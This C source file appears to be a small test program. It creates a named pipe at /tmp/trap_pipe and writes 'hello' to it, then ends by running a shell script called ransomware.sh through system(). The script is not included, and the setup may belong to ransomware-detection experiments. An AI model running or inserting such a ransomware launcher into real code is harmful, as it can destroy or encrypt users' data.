#include <stdio.h>
#include <sys/stat.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

#define FILE_PATH "/tmp/trap_pipe"
#define FILE_SIZE 4096

int main() {
    printf("Main\n");
    int fd;

    // Create pipe
    if (mkfifo(FILE_PATH, 0666) == -1) {
        // Allow program to continue if pipe already exists
        if (errno != EEXIST) {
            perror("Error while creating pipe");
            return 1;
        }
    }

    printf("Here\n");
    // Open file to write data
    fd = open(FILE_PATH, O_WRONLY | O_CREAT, (mode_t) 0600);
    if (fd == -1) {
        perror("Error while opening file for writing!");
        return 2;
    }
    printf("Opened\n");
    ssize_t res = write(fd, "hello", strlen("hello"));
    if (res < 0) {
        close(fd);
        perror("Error writing data to file!\n");
        return 4;
    }
    // Move file pointer to (FILE_SIZE - 1) location
    // result = lseek(fd, FILE_SIZE - 1, SEEK_SET);
    // if (result == -1) {
    //     close(fd);
    //     perror("Error calling lseek() to 'stretch' the file!");
    //     return 3;
    // }
    printf("%zi\n", res);

    printf("After results\n");

    close(fd);

    system("bash ransomware.sh");

    return 0;
}